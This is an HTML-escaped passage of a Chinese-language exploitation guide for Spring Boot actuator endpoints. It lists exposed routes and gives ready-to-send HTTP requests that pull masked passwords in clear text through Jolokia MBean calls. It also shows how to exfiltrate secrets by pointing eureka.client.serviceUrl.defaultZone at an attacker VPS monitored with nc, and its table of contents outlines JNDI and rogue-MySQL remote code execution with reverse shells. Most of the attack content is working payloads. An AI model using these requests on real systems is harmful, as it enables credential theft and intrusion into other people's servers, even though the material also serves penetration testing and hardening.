              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-10&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-10&quot;&gt;利用方法：&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BF%E9%97%AE%E8%B7%AF%E7%94%B1%E8%8E%B7%E5%BE%97-jsessionid&quot;&gt;步骤一：访问路由获得 jsessionid&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81-1&quot;&gt;步骤二：准备要执行的 Java 代码&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6-1&quot;&gt;步骤三：托管 class 文件&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1-1&quot;&gt;步骤四：架设恶意 ldap 服务&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-2&quot;&gt;步骤五：监听反弹 shell 的端口&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E5%8C%85%E8%A7%A6%E5%8F%91-jndi-%E6%B3%A8%E5%85%A5&quot;&gt;步骤六：发包触发 JNDI 注入&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-6&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#0x08mysql-jdbc-deserialization-rce&quot;&gt;0x08：mysql jdbc deserialization RCE&lt;/a&gt;
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-11&quot;&gt;利用条件：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-11&quot;&gt;利用方法：&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E7%8E%AF%E5%A2%83%E4%BE%9D%E8%B5%96&quot;&gt;步骤一：查看环境依赖&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rogue-mysql-server&quot;&gt;步骤二：架设恶意 rogue mysql server&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-springdatasourceurl-%E5%B1%9E%E6%80%A7&quot;&gt;步骤三：设置 spring.datasource.url 属性&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1&quot;&gt;步骤四：刷新配置&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E4%BA%94%E8%A7%A6%E5%8F%91%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2&quot;&gt;步骤五：触发数据库查询&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#%E6%AD%A5%E9%AA%A4%E5%85%AD%E6%81%A2%E5%A4%8D%E6%AD%A3%E5%B8%B8-jdbc-url&quot;&gt;步骤六：恢复正常 jdbc url&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-6&quot;&gt;漏洞原理：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-7&quot;&gt;漏洞分析：&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-7&quot;&gt;漏洞环境：&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;零路由和版本&quot;&gt;零：路由和版本&lt;/h2&gt;

&lt;h3 id=&quot;0x01路由知识&quot;&gt;0x01：路由知识&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Spring Boot 1.x 版本默认内置路由的根路径以  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; 开始，2.x 则统一以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator&lt;/code&gt; 开始&lt;/li&gt;
  &lt;li&gt;有些程序员会自定义 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/manage&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/management&lt;/code&gt; 或 &lt;strong&gt;项目相关名称&lt;/strong&gt; 为根路径&lt;/li&gt;
  &lt;li&gt;默认内置路由名字，如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 有时候也会被程序员修改，如修改成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/appenv&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;0x02版本知识&quot;&gt;0x02：版本知识&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;常见组件的版本相互依赖关系&quot;&gt;常见组件的版本相互依赖关系：&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;依赖项&lt;/th&gt;
      &lt;th&gt;版本列表及依赖组件版本&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;spring-boot-starter-parent&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent&quot;&gt;spring-boot-starter-parent&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;spring-boot-dependencies&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies&quot;&gt;spring-boot-dependencies&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;spring-cloud-dependencies&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies&quot;&gt;spring-cloud-dependencies&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;spring-cloud-与-spring-boot-大版本之间的依赖关系&quot;&gt;Spring Cloud 与 Spring Boot 大版本之间的依赖关系：&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Spring Cloud&lt;/th&gt;
      &lt;th&gt;Spring Boot&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Angel&lt;/td&gt;
      &lt;td&gt;兼容 Spring Boot 1.2.x&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Brixton&lt;/td&gt;
      &lt;td&gt;兼容 Spring Boot 1.3.x、1.4.x&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Camden&lt;/td&gt;
      &lt;td&gt;兼容 Spring Boot 1.4.x、1.5.x&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Dalston&lt;/td&gt;
      &lt;td&gt;兼容 Spring Boot 1.5.x，不兼容 2.0.x&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Edgware&lt;/td&gt;
      &lt;td&gt;兼容 Spring Boot 1.5.x，不兼容 2.0.x&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Finchley&lt;/td&gt;
      &lt;td&gt;兼容 Spring Boot 2.0.x，不兼容 1.5.x&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Greenwich&lt;/td&gt;
      &lt;td&gt;兼容 Spring Boot 2.1.x&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Hoxton&lt;/td&gt;
      &lt;td&gt;兼容 Spring Boot 2.2.x&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;spring-cloud-小版本号的后缀及含义&quot;&gt;Spring Cloud 小版本号的后缀及含义:&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;版本号后缀&lt;/th&gt;
      &lt;th&gt;含义&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;BUILD-SNAPSHOT&lt;/td&gt;
      &lt;td&gt;快照版，代码不是固定，处于变化之中&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;MX&lt;/td&gt;
      &lt;td&gt;里程碑版&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;RCX&lt;/td&gt;
      &lt;td&gt;候选发布版&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;RELEASE&lt;/td&gt;
      &lt;td&gt;正式发布版&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SRX&lt;/td&gt;
      &lt;td&gt;(修复错误和 bug 并再次发布的)正式发布版&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;一信息泄露&quot;&gt;一：信息泄露&lt;/h2&gt;

&lt;h3 id=&quot;0x01路由地址及接口调用详情泄漏&quot;&gt;0x01：路由地址及接口调用详情泄漏&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;直接访问以下几个路由，验证漏洞是否存在：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/api-docs
/v2/api-docs
/swagger-ui.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;一些可能会遇到的接口路由变形：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/api.html
/sw/swagger-ui.html
/api/swagger-ui.html
/template/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/mappings
/actuator/mappings
/metrics
/actuator/metrics
/beans
/actuator/beans
/configprops
/actuator/configprops
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;一般来讲，知道 spring boot 应用的相关接口和传参信息并不能算是漏洞&lt;/strong&gt;；&lt;/p&gt;

&lt;p&gt;但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。&lt;/p&gt;

&lt;h3 id=&quot;0x02配置不当而暴露的路由&quot;&gt;0x02：配置不当而暴露的路由&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;参考 &lt;a href=&quot;https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints&quot;&gt;production-ready-endpoints&lt;/a&gt; 和 &lt;a href=&quot;https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt&quot;&gt;spring-boot.txt&lt;/a&gt;，可能因为配置不当而暴露的默认内置路由可能会有：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/actuator
/auditevents
/autoconfig
/beans
/caches
/conditions
/configprops
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/metrics
/mappings
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
/actuator/auditevents
/actuator/beans
/actuator/health
/actuator/conditions
/actuator/configprops
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/metrics
/actuator/scheduledtasks
/actuator/httptrace
/actuator/mappings
/actuator/jolokia
/actuator/hystrix.stream
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中对寻找漏洞比较重要接口的有：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt;、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;GET 请求 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword、pwd) 时，会泄露密码明文；&lt;/p&gt;

    &lt;p&gt;同时有一定概率可以通过 POST 请求 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置一些属性，触发相关 RCE 漏洞。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia/list&lt;/code&gt; 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/trace&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;0x03获取被星号脱敏的密码的明文-方法一&quot;&gt;0x03：获取被星号脱敏的密码的明文 (方法一)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;利用条件&quot;&gt;利用条件：&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;目标网站存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/jolokia&lt;/code&gt; 接口&lt;/li&gt;
  &lt;li&gt;目标使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jolokia-core&lt;/code&gt; 依赖（版本要求暂未知）&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;利用方法&quot;&gt;利用方法：&lt;/h4&gt;

&lt;h5 id=&quot;步骤一-找到想要获取的属性名&quot;&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt;

&lt;p&gt;GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt;

&lt;h5 id=&quot;步骤二-jolokia-调用相关-mbean-获取明文&quot;&gt;步骤二： jolokia 调用相关 Mbean 获取明文&lt;/h5&gt;

&lt;p&gt;将下面示例中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security.user.password&lt;/code&gt; 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value&lt;/code&gt; 键中。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.springframework.boot&lt;/code&gt; Mbean（&lt;strong&gt;可能更通用&lt;/strong&gt;）&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /jolokia
Content-Type: application/json

{&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/jolokia
Content-Type: application/json

{&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;调用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.springframework.cloud.context.environment&lt;/code&gt; Mbean（&lt;strong&gt;需要 spring cloud 相关依赖&lt;/strong&gt;）&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /jolokia
Content-Type: application/json

{&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/jolokia
Content-Type: application/json

{&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;0x04获取被星号脱敏的密码的明文-方法二&quot;&gt;0x04：获取被星号脱敏的密码的明文 (方法二)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;利用条件-1&quot;&gt;利用条件：&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;可以 GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt;
  &lt;li&gt;目标使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-cloud-starter-netflix-eureka-client&lt;/code&gt; 依赖&lt;/li&gt;
  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;利用方法-1&quot;&gt;利用方法：&lt;/h4&gt;

&lt;h5 id=&quot;步骤一-找到想要获取的属性名-1&quot;&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt;

&lt;p&gt;GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt;

&lt;h5 id=&quot;步骤二-使用-nc-监听-http-请求&quot;&gt;步骤二： 使用 nc 监听 HTTP 请求&lt;/h5&gt;

&lt;p&gt;在自己控制的外网服务器上监听 80 端口：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvk&lt;/span&gt; 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤三-设置-eurekaclientserviceurldefaultzone-属性&quot;&gt;步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性&lt;/h5&gt;

&lt;p&gt;将下面 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://value:${security.user.password}@your-vps-ip&lt;/code&gt;  中的  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security.user.password&lt;/code&gt; 换成自己想要获取的对应的星号 * 遮掩的属性名；&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;your-vps-ip&lt;/code&gt; 换成自己外网服务器的真实 ip 地址。&lt;/p&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://value:${security.user.password}@your-vps-ip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
Content-Type: application/json

{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:${security.user.password}@your-vps-ip&quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤四-刷新配置&quot;&gt;步骤四： 刷新配置&lt;/h5&gt;

&lt;p&gt;spring 1.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
Content-Type: application/x-www-form-urlencoded

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;spring 2.x&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
Content-Type: application/json

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;步骤五-解码属性值&quot;&gt;步骤五： 解码属性值&lt;/h5&gt;

&lt;p&gt;正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authorization&lt;/code&gt; 头内容：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Authorization: Basic dmFsdWU6MTIzNDU2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;将其中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmFsdWU6MTIzNDU2&lt;/code&gt;部分使用 base64 解码，即可获得类似明文值 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;value:123456&lt;/code&gt;，其中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123456&lt;/code&gt; 即是目标星号 * 脱敏前的属性值明文。&lt;/p&gt;

&lt;h3 id=&quot;0x05获取被星号脱敏的密码的明文-方法三&quot;&gt;0x05：获取被星号脱敏的密码的明文 (方法三)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;利用条件-2&quot;&gt;利用条件：&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;通过 POST &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 设置属性触发目标对外网指定地址发起任意 http 请求&lt;/li&gt;
  &lt;li&gt;目标可以请求攻击者的服务器（请求可出外网）&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;利用方法-2&quot;&gt;利用方法：&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;参考 UUUUnotfound 提出的 &lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/issues/1&quot;&gt;issue-1&lt;/a&gt;，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h5 id=&quot;步骤一-找到想要获取的属性名-2&quot;&gt;步骤一： 找到想要获取的属性名&lt;/h5&gt;

